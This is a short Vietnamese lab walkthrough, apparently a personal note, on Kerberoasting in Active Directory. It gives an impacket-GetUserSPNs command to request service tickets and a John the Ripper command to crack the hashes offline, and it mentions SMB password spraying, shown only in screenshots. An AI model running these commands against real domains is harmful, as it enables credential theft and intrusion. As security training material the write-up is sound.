```
Kerberoasting là một kỹ thuật tấn công lợi dụng giao thức xác thực Kerberos trong Active Directory để trích xuất mã băm mật khẩu tài khoản dịch vụ.

Bất kỳ người dùng miền đã xác thực nào cũng có thể yêu cầu vé Dịch vụ cấp vé (TGS) cho tài khoản được liên kết với Tên dịch vụ chính (SPN) .

Một số phần của TGS được mã hóa bằng hàm băm mật khẩu NTLM của tài khoản dịch vụ .

Sau đó, kẻ tấn công có thể xóa các vé TGS này và thực hiện các cuộc tấn công bằng vũ lực hoặc từ điển ngoại tuyến để khôi phục mật khẩu dạng văn bản rõ của tài khoản dịch vụ.
```

- Yêu cầu TGS cho tài khoản được liên kết với SPN:

```
impacket-GetUserSPNs cs.org/kai.bel:password1 -request -dc-ip 192.168.200.129 -outputfile hash.kerberos
```

-> thu được hàm băm của mật khẩu được mã hóa bằng NTLM.

<img width="1043" height="162" alt="image" src="https://github.com/user-attachments/assets/f8801af1-9c25-4e39-b6b2-d9553fd84e3f" />

-> Đoc file hash.kerberos:
<img width="670" height="550" alt="image" src="https://github.com/user-attachments/assets/5ae91fd3-8677-4f79-86a2-0d10741056d1" />

- Thực hiện bẻ khóa mật khẩu với John the Ripper

```
john --format=krb5tgs hash.kerberos --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="812" height="169" alt="image" src="https://github.com/user-attachments/assets/9dafc5f1-cdb0-4f29-abca-a258654f7260" />

<img width="812" height="169" alt="image" src="https://github.com/user-attachments/assets/1ca7db11-b460-4ba6-934c-ea89544b8fb6" />

<img width="578" height="245" alt="image" src="https://github.com/user-attachments/assets/81117a57-4746-4d4b-87fe-c1d1a5e56d25" />

- Thử tấn công kiểu password spraying / credential stuffing lên SMB để tìm tài khoản có mật khẩu yếu. Lọc output để dễ thấy các kết quả quan trọng (thành công, bị khóa, lỗi khác) thay vì ngập trong hàng loạt “logon failure”.
<img width="1015" height="70" alt="image" src="https://github.com/user-attachments/assets/dd1b6ee6-ae54-4965-b95a-c5bae8953711" />

